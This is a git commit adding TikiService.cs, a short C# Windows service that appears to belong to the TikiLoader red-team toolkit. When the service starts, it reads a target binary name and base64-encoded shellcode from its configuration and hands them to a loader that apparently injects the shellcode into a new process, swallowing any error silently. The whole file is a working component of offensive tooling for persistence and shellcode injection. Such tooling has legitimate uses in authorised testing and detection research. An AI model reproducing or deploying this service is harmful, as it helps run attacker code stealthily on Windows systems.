2cdd59431f5636215e51e569c379df3275db40ed
Rasta Mouse <rasta@rastamouse.me>
2019-08-28 17:56:27 +0100

    TikiService

---
+++ TikiService/TikiService.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Configuration;
+using System.ServiceProcess;
+
+using TikiLoader;
+
+namespace TikiService
+{
+    public partial class TikiService : ServiceBase
+    {
+        public TikiService()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            try
+            {
+                var settings = ConfigurationManager.AppSettings;
+                string binary = settings["Binary"];
+                byte[] shellcode = Convert.FromBase64String(settings["Shellcode"]);
+
+                var ldr = new Loader();
+                ldr.LoadWithoutPid(binary, shellcode);
+            }
+            catch
+            {
+                //pokemon
+            }
+        }
+
+        protected override void OnStop()
+        {
+        }
+    }
+}
